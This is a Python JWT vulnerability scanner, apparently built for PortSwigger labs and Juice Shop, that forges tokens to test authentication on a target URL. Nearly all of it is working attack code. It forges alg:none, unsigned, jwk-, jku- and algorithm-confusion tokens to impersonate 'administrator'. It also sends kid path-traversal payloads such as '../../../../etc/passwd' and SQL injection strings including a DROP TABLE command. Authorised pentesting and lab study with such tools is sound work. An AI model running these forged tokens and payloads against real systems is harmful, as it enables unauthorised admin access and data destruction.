#!/usr/bin/env python3
"""
JWT Security Scanner - Unified (PortSwigger + Juice Shop)
Tests 8 Critical JWT Vulnerabilities (fully implemented)
MODIFIED: Receives authenticated session + JWT from external auth handler
"""

import argparse
import base64
import json
import hmac
import hashlib
import requests
import time
import re
from typing import Optional
from datetime import datetime

try:
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[WARN] cryptography not installed. jwk/jku tests disabled.")


class JWTScanner:
    def __init__(self, args, session: requests.Session, jwt_token: Optional[str]):
        """
        MODIFIED: Now accepts pre-authenticated session and JWT token.
        No authentication logic inside anymore.
        
        Args:
            args: Command line arguments
            session: Already authenticated requests.Session from auth_handler
            jwt_token: Extracted JWT token (or None if cookie-based only)
        """
        self.url = args.url.rstrip('/')
        self.protected_endpoint = args.protected_endpoint
        self.token = jwt_token  # Use the passed JWT token
        self.session = session  # Use the passed authenticated session
        self.wordlist = args.wordlist
        self.output = args.output
        self.verbose = args.verbose
        self.timeout = args.timeout
        self.results = []
        self.max_secret_tests = args.max_secret_tests
        self.jku_callback_server = args.jku_callback_server
        
        # Algorithm confusion specific
        self.public_key_file = args.public_key_file if hasattr(args, 'public_key_file') else None
        self.admin_endpoint = args.admin_endpoint if hasattr(args, 'admin_endpoint') else '/admin'
        self.target_user = args.target_user if hasattr(args, 'target_user') else 'administrator'
        self.token_location = args.token_location if hasattr(args, 'token_location') else 'both'

    def log(self, msg, level="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        if self.verbose or level in ["VULN","ERROR","CRITICAL","HIGH","MEDIUM"]:
            print(f"[{ts}][{level}] {msg}")

    def b64url_encode(self, data):
        if isinstance(data, str):
            data = data.encode()
        return base64.urlsafe_b64encode(data).decode().rstrip('=')

    def b64url_decode(self, data):
        pad = 4 - (len(data) % 4)
        if pad != 4:
            data += '=' * pad
        return base64.urlsafe_b64decode(data)

    def send_test_request(self, forged_token):
        """Send request with forged JWT token using the authenticated session"""
        test_url = f"{self.url}{self.protected_endpoint}"
        try:
            headers = {'Authorization': f'Bearer {forged_token}'}
            cookies = {'session': forged_token}
            # Use the pre-authenticated session (which already has cookies/session)
            resp = self.session.get(
                test_url,
                headers=headers,
                cookies=cookies,
                params={"token": forged_token, "jwt": forged_token},
                timeout=self.timeout,
                allow_redirects=False
            )
            return resp
        except requests.exceptions.Timeout:
            self.log("Request timeout", "ERROR")
            return None
        except Exception as e:
            self.log(f"Request failed: {e}", "ERROR")
            return None

    # --------------------- VULNERABILITY TESTS (UNCHANGED CONTENT) ---------------------

    def test_1_alg_none_bypass(self):
        """Try alg: none with original payload (if token exists) or with 'admin'/'administrator'"""
        self.log("Testing Vulnerability 1: alg: none bypass...", "INFO")
        subjects = ["admin", "administrator"]
        vulnerable = False

        # First, try with original token payload (most accurate)
        if self.token:
            try:
                parts = self.token.split('.')
                original_payload = json.loads(self.b64url_decode(parts[1]).decode('utf-8'))
                header = {"alg": "none", "typ": "JWT"}
                hb64 = self.b64url_encode(json.dumps(header))
                pb64 = self.b64url_encode(json.dumps(original_payload))
                forged = f"{hb64}.{pb64}."
                resp = self.send_test_request(forged)
                if resp and resp.status_code in [200, 201, 202, 302]:
                    self.log("✓ VULNERABLE: alg:none token accepted (using original payload)!", "CRITICAL")
                    vulnerable = True
            except Exception as e:
                self.log(f"Error using original payload: {e}", "DEBUG")

        # If not vulnerable yet, try admin and administrator subjects
        if not vulnerable:
            for sub in subjects:
                try:
                    payload = {"sub": sub, "iat": int(time.time()), "exp": int(time.time())+3600}
                    header = {"alg": "none", "typ": "JWT"}
                    hb64 = self.b64url_encode(json.dumps(header))
                    pb64 = self.b64url_encode(json.dumps(payload))
                    forged = f"{hb64}.{pb64}."
                    resp = self.send_test_request(forged)
                    if resp and resp.status_code in [200, 201, 202, 302]:
                        self.log(f"✓ VULNERABLE: alg:none token accepted (sub={sub})!", "CRITICAL")
                        vulnerable = True
                        break
                except Exception as e:
                    self.log(f"Error with sub={sub}: {e}", "DEBUG")

        if vulnerable:
            self.results.append({"vulnerability": "alg: none Bypass", "severity": "CRITICAL", "vulnerable": True})
        else:
            self.log("✗ SAFE: alg:none rejected for all attempts", "SAFE")
            self.results.append({"vulnerability": "alg: none Bypass", "severity": "CRITICAL", "vulnerable": False})

    def test_2_missing_signature(self):
        self.log("Testing Vulnerability 2: Missing signature...", "INFO")
        if not self.token:
            self.log("Skipping - no valid token", "WARN")
            return
        try:
            parts = self.token.split('.')
            forged = f"{parts[0]}.{parts[1]}."
            resp = self.send_test_request(forged)
            if resp and resp.status_code in [200,201,202]:
                self.log("✓ VULNERABLE: missing signature accepted!", "CRITICAL")
                self.results.append({"vulnerability": "Missing Signature", "severity": "CRITICAL", "vulnerable": True})
            else:
                self.log("✗ SAFE", "SAFE")
                self.results.append({"vulnerability": "Missing Signature", "severity": "CRITICAL", "vulnerable": False})
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")

    def test_3_weak_secret_bruteforce(self):
        self.log("Testing Vulnerability 3: Weak secret bruteforce...", "INFO")
        if not self.token:
            self.log("Skipping - no valid token", "WARN")
            return
        try:
            parts = self.token.split('.')
            hdr = json.loads(self.b64url_decode(parts[0]).decode())
            if hdr.get('alg') != 'HS256':
                self.log("Token uses RS256, skipping weak secret test", "INFO")
                self.results.append({"vulnerability": "Weak Secret Bruteforce", "severity": "MEDIUM", "vulnerable": False})
                return
            data = f"{parts[0]}.{parts[1]}".encode()
            orig_sig = parts[2]
            secrets = ["secret","password","admin123","changeme","jwtsecret","secret1"]
            for s in secrets[:self.max_secret_tests or len(secrets)]:
                test_sig = hmac.new(s.encode(), data, hashlib.sha256).digest()
                test_b64 = base64.urlsafe_b64encode(test_sig).decode().rstrip('=')
                if test_b64 == orig_sig:
                    self.log(f"✓ VULNERABLE: weak secret '{s}'", "MEDIUM")
                    self.results.append({"vulnerability": "Weak Secret Bruteforce", "severity": "MEDIUM", "vulnerable": True, "secret": s})
                    return
            self.log("✗ SAFE: no weak secret found", "SAFE")
            self.results.append({"vulnerability": "Weak Secret Bruteforce", "severity": "MEDIUM", "vulnerable": False})
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")

    def test_4_jwk_injection(self):
        self.log("Testing Vulnerability 4: jwk injection...", "INFO")
        if not CRYPTO_AVAILABLE:
            self.results.append({"vulnerability": "jwk Injection", "severity": "CRITICAL", "vulnerable": False, "note": "crypto missing"})
            return
        try:
            priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            pub = priv.public_key()
            nums = pub.public_numbers()
            n_b64 = self.b64url_encode(nums.n.to_bytes((nums.n.bit_length()+7)//8, 'big'))
            e_b64 = self.b64url_encode(nums.e.to_bytes((nums.e.bit_length()+7)//8, 'big'))
            jwk = {"kty": "RSA", "n": n_b64, "e": e_b64}
            header = {"alg": "RS256", "typ": "JWT", "jwk": jwk}
            # Try both admin and administrator as fallback
            sub = "administrator"  # PortSwigger expects this
            payload = {"sub": sub, "iat": int(time.time()), "exp": int(time.time())+3600}
            hb64 = self.b64url_encode(json.dumps(header))
            pb64 = self.b64url_encode(json.dumps(payload))
            signing_input = f"{hb64}.{pb64}".encode()
            sig = priv.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
            sig_b64 = self.b64url_encode(sig)
            forged = f"{hb64}.{pb64}.{sig_b64}"
            resp = self.send_test_request(forged)
            if resp and resp.status_code in [200,201,202]:
                self.log("✓ VULNERABLE: jwk injection accepted!", "CRITICAL")
                self.results.append({"vulnerability": "jwk Injection", "severity": "CRITICAL", "vulnerable": True})
            else:
                self.log("✗ SAFE", "SAFE")
                self.results.append({"vulnerability": "jwk Injection", "severity": "CRITICAL", "vulnerable": False})
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")
            self.results.append({"vulnerability": "jwk Injection", "severity": "CRITICAL", "vulnerable": False})

    def test_5_jku_injection(self):
        self.log("Testing Vulnerability 5: jku injection...", "INFO")
        if not CRYPTO_AVAILABLE:
            self.results.append({"vulnerability": "jku Injection", "severity": "HIGH", "vulnerable": False, "note": "crypto missing"})
            return
        try:
            priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            pub = priv.public_key()
            nums = pub.public_numbers()
            self.b64url_encode(nums.n.to_bytes((nums.n.bit_length()+7)//8, 'big'))
            self.b64url_encode(nums.e.to_bytes((nums.e.bit_length()+7)//8, 'big'))
            callback = self.jku_callback_server or "http://localhost:9000/.well-known/jwks.json"
            header = {"alg": "RS256", "typ": "JWT", "jku": callback, "kid": "malicious"}
            payload = {"sub": "administrator", "iat": int(time.time()), "exp": int(time.time())+3600}
            hb64 = self.b64url_encode(json.dumps(header))
            pb64 = self.b64url_encode(json.dumps(payload))
            signing_input = f"{hb64}.{pb64}".encode()
            sig = priv.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
            sig_b64 = self.b64url_encode(sig)
            forged = f"{hb64}.{pb64}.{sig_b64}"
            resp = self.send_test_request(forged)
            if resp and resp.status_code in [200,201,202]:
                self.log("✓ VULNERABLE: jku injection accepted!", "CRITICAL")
                self.results.append({"vulnerability": "jku Injection", "severity": "HIGH", "vulnerable": True})
            else:
                self.log("✗ SAFE", "SAFE")
                self.results.append({"vulnerability": "jku Injection", "severity": "HIGH", "vulnerable": False})
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")
            self.results.append({"vulnerability": "jku Injection", "severity": "HIGH", "vulnerable": False})

    def test_6_kid_path_traversal(self):
        self.log("Testing Vulnerability 6: kid path traversal...", "INFO")
        payloads = ["../../../../../dev/null", "../../../../etc/passwd"]
        try:
            for p in payloads:
                header = {"alg": "HS256", "typ": "JWT", "kid": p}
                payload = {"sub": "administrator", "iat": int(time.time())}
                hb64 = self.b64url_encode(json.dumps(header))
                pb64 = self.b64url_encode(json.dumps(payload))
                signing_input = f"{hb64}.{pb64}".encode()
                for sec in [b'', b'secret']:
                    sig = hmac.new(sec, signing_input, hashlib.sha256).digest()
                    sig_b64 = self.b64url_encode(sig)
                    forged = f"{hb64}.{pb64}.{sig_b64}"
                    resp = self.send_test_request(forged)
                    if resp and resp.status_code in [200,201,202]:
                        self.log(f"✓ VULNERABLE: kid path traversal with {p}", "CRITICAL")
                        self.results.append({"vulnerability": "kid Path Traversal", "severity": "CRITICAL", "vulnerable": True})
                        return
            self.log("✗ SAFE", "SAFE")
            self.results.append({"vulnerability": "kid Path Traversal", "severity": "CRITICAL", "vulnerable": False})
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")

    def test_7_algorithm_confusion(self):
        """Universal Algorithm Confusion Detection (RS256 → HS256)"""
        self.log("Testing Vulnerability 7: Algorithm confusion (RS256→HS256)...", "INFO")

        # Check if public key is provided
        if not hasattr(self, 'public_key_file') or not self.public_key_file:
            self.log("No public key provided. Use --public-key-file to enable this test", "WARN")
            self.results.append({"vulnerability": "Algorithm Confusion", "severity": "CRITICAL", "vulnerable": False})
            return

        try:
            # Step 1: Load and decode public key
            self.log("Loading public key...", "INFO")
            key_data = self.public_key_file

            # Check if it's a file path
            import os
            if os.path.isfile(key_data):
                with open(key_data, 'r') as f:
                    key_data = f.read()

            # Clean the key (remove whitespace and PEM headers)
            key_data = re.sub(r'\s', '', key_data)
            if '-----BEGIN' in key_data:
                key_data = re.sub(r'-----BEGIN[^-]+-----', '', key_data)
                key_data = re.sub(r'-----END[^-]+-----', '', key_data)

            # Add padding if needed
            padding = 4 - (len(key_data) % 4)
            if padding != 4:
                key_data += '=' * padding

            public_key_bytes = base64.b64decode(key_data)
            self.log(f"✓ Public key loaded ({len(public_key_bytes)} bytes)", "INFO")

            # Step 2: Create forged admin token
            self.log(f"Creating forged token (target user: {self.target_user})...", "INFO")

            # Header: HS256 algorithm (the key point of confusion attack)
            header = {"alg": "HS256", "typ": "JWT"}

            # Payload: Impersonate target user
            payload = {
                "sub": self.target_user,
                "iat": int(time.time()),
                "exp": int(time.time()) + 3600
            }

            # Encode without spaces (strict format)
            header_b64 = self.b64url_encode(json.dumps(header, separators=(',', ':')))
            payload_b64 = self.b64url_encode(json.dumps(payload, separators=(',', ':')))
            signing_input = f"{header_b64}.{payload_b64}".encode()

            # Sign using public key as HMAC secret (the attack!)
            signature = hmac.new(public_key_bytes, signing_input, hashlib.sha256).digest()
            signature_b64 = self.b64url_encode(signature)

            forged_token = f"{header_b64}.{payload_b64}.{signature_b64}"
            self.log(f"Forged token created: {forged_token[:80]}...", "DEBUG")

            # Step 3: Send request to protected endpoint
            test_url = f"{self.url}{self.admin_endpoint}"
            self.log(f"Testing {test_url}...", "INFO")

            # Prepare request based on token location
            headers = {}
            cookies = {}
            params = {}

            if self.token_location == 'header' or self.token_location == 'both':
                headers['Authorization'] = f'Bearer {forged_token}'

            if self.token_location == 'cookie' or self.token_location == 'both':
                cookies['session'] = forged_token
                cookies['token'] = forged_token
                cookies['jwt'] = forged_token

            if self.token_location == 'param' or self.token_location == 'both':
                params['token'] = forged_token
                params['jwt'] = forged_token

            # Default: try both header and cookie
            if self.token_location == 'both' or not self.token_location:
                headers['Authorization'] = f'Bearer {forged_token}'
                cookies['session'] = forged_token

            response = self.session.get(
                test_url,
                headers=headers,
                cookies=cookies,
                params=params,
                timeout=self.timeout,
                allow_redirects=False
            )

            self.log(f"Response status: {response.status_code}", "INFO")

            # Step 4: Analyze response
            if response.status_code in [200, 201, 202, 302, 303]:
                self.log("✓ VULNERABLE: Algorithm confusion succeeded!", "CRITICAL")
                self.results.append({
                    "vulnerability": "Algorithm Confusion (RS256→HS256)",
                    "severity": "CRITICAL",
                    "vulnerable": True,
                    "proof": f"Status: {response.status_code}"
                })
            else:
                self.log("✗ SAFE: Algorithm confusion failed", "SAFE")
                self.results.append({"vulnerability": "Algorithm Confusion", "severity": "CRITICAL", "vulnerable": False})

        except Exception as e:
            self.log(f"Error in algorithm confusion test: {e}", "ERROR")
            self.results.append({"vulnerability": "Algorithm Confusion", "severity": "CRITICAL", "vulnerable": False})

    def test_8_sql_injection(self):
        """SQL Injection via kid parameter – fully implemented."""
        self.log("Testing Vulnerability 8: SQL Injection via kid...", "INFO")
        sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users; --",
            "' OR 1=1 --"
        ]
        try:
            vulnerable = False
            for sql_payload in sql_payloads:
                header = {"alg": "HS256", "typ": "JWT", "kid": sql_payload}
                payload = {"sub": "admin", "iat": int(time.time())}
                hb64 = self.b64url_encode(json.dumps(header))
                pb64 = self.b64url_encode(json.dumps(payload))
                forged_token = f"{hb64}.{pb64}."
                resp = self.send_test_request(forged_token)
                if resp:
                    response_text = resp.text.lower()
                    sql_errors = ["sql syntax", "mysql_fetch", "ora-", "postgresql", "sqlite", "unclosed quotation"]
                    for error in sql_errors:
                        if error in response_text:
                            self.log(f"✓ VULNERABLE: SQL injection possible with payload: {sql_payload}", "HIGH")
                            vulnerable = True
                            break
                if vulnerable:
                    break
            if vulnerable:
                self.results.append({"vulnerability": "SQL Injection via kid", "severity": "HIGH", "vulnerable": True})
            else:
                self.log("✗ SAFE: No SQL injection detected", "SAFE")
                self.results.append({"vulnerability": "SQL Injection via kid", "severity": "HIGH", "vulnerable": False})
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")
            self.results.append({"vulnerability": "SQL Injection via kid", "severity": "HIGH", "vulnerable": False})

    def generate_report(self):
        vuln_count = sum(1 for r in self.results if r.get("vulnerable"))
        report = {
            "target": self.url,
            "protected_endpoint": self.protected_endpoint,
            "timestamp": datetime.now().isoformat(),
            "results": self.results,
            "summary": {"total_vulnerable": vuln_count, "total_tests": len(self.results)}
        }
        with open(self.output, 'w') as f:
            json.dump(report, f, indent=2)
        self.log(f"Report saved to {self.output}", "INFO")
        print("\n" + "=" * 70)
        print("JWT SECURITY SCAN SUMMARY")
        print("=" * 70)
        for r in self.results:
            status = "VULNERABLE" if r.get("vulnerable") else "SAFE"
            print(f"{r['vulnerability']:<45} {status}")
        print("=" * 70)
        print(f"\nTotal Vulnerabilities Found: {vuln_count}/8")

    def run(self):
        print("=" * 70)
        print("JWT SECURITY SCANNER v2.0 (Unified, Fully Implemented)")
        print("=" * 70)
        
        if self.token:
            self.log(f"✓ Using provided JWT token: {self.token[:50]}...", "INFO")
        else:
            self.log("⚠ No JWT token provided - some tests will be skipped", "WARN")
        
        self.log("\nStep 2: Running vulnerability tests...", "INFO")
        self.test_1_alg_none_bypass()
        self.test_2_missing_signature()
        self.test_3_weak_secret_bruteforce()
        self.test_4_jwk_injection()
        self.test_5_jku_injection()
        self.test_6_kid_path_traversal()
        self.test_7_algorithm_confusion()
        self.test_8_sql_injection()
        self.generate_report()


def main():
    parser = argparse.ArgumentParser(description="JWT Security Scanner (Unified) - MODIFIED: Expects pre-authenticated session")

    # Target configuration
    parser.add_argument("--url", required=True, help="Target base URL")
    parser.add_argument("--protected-endpoint", required=True, help="Protected endpoint requiring JWT")

    # Token input (from auth_handler)
    parser.add_argument("--token", help="JWT token (from previous authentication)")

    # Algorithm confusion specific
    parser.add_argument("--public-key-file", help="PEM file or Base64 encoded public key for algorithm confusion test")
    parser.add_argument("--admin-endpoint", default="/admin", help="Protected endpoint for algorithm confusion (default: /admin)")
    parser.add_argument("--target-user", default="administrator", help="User to impersonate (default: administrator)")
    parser.add_argument("--token-location", choices=['header', 'cookie', 'param', 'both'], default='both',
                       help="Where to send the token (default: both)")

    # Other options
    parser.add_argument("--wordlist", default="", help="Path to weak secrets dictionary")
    parser.add_argument("--output", default="jwt_scan_report.json", help="Output report file")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--max-secret-tests", type=int, default=0, help="Max secrets to test")
    parser.add_argument("--jku-callback-server", default="", help="Server URL for jku testing")

    args = parser.parse_args()

    # Validate: token is now optional (some tests may work without)
    if not args.token:
        print("WARNING: No --token provided. Tests that require a valid JWT will be skipped.")
    
    # IMPORTANT: This modified scanner expects you to pass the session externally.
    # You need to create the session in your calling code (orchestrator).
    # For standalone testing without external orchestrator, create a fresh session.
    session = requests.Session()
    
    scanner = JWTScanner(args, session, args.token)
    scanner.run()


if __name__ == "__main__":
    main()
